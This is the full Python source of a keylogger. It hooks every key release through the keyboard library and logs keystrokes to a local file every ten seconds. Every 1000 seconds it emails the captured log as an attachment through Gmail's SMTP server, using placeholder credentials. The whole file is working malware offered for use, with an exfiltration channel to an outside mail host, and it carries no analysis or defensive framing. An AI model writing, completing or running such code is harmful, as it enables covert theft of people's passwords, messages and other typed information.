import keyboard
import sys
from threading import Semaphore, Timer
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

INTERVAL_SAVE_KEY = 10 # 10 seconds
INTERVAL_SEND_EMAIL = 1000 # 1000 seconds
EMAIL_ADDRESS = "yourEmail"
EMAIL_PASSWORD = "yourPassword"

class Keylogger:
    def __init__(self, fileName, intervalKey, intervalMail):
        self.key = ""
        self.fileName = fileName
        self.interval = intervalKey
        self.intervalMail = intervalMail
        self.semaphore = Semaphore(0)


    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == 'enter':
                name = "enter\n"
            elif name == 'decimal':
                name = "."
            elif name == 'esc':
                sys.exit(0)
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.key += name

            

    def __writeFile(self, buffer):
        fp = open(self.fileName, 'a')
        fp.write(buffer)
        fp.close()

    def report(self):
        if self.key:
            self.__writeFile(self.key)
        self.key = ""
        Timer(interval=self.interval, function=self.report).start()
    
    def __sendEmail(self, email, password, file):
        ####################
        # Create message
        ####################
        message = MIMEMultipart()
        message["From"] = email
        message["To"] = email # You can change both
        fp = open(file, 'rb')
        part = MIMEBase("application", "octet-stream")
        part.set_payload(fp.read())
        fp.close()
        message.attach(part)
        text = message.as_string()
        ####################
        # Send message
        ####################
        server = smtplib.SMTP(host="smtp.gmail.com", port=587) # Please change your host accordingly: e.g. for yahoo: mail.yahoo.com
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, text)
        server.quit()

    def send(self):
        if self.key:
            self.__sendEmail(EMAIL_ADDRESS, EMAIL_PASSWORD, "testKeyboard.txt")
        Timer(interval=self.intervalMail, function=self.send).start()
    
    def run(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.send()
        self.semaphore.acquire()


if __name__ == "__main__":
    keyLogger = Keylogger("testKeyboard.txt", INTERVAL_SAVE_KEY, INTERVAL_SEND_EMAIL)
    keyLogger.run()




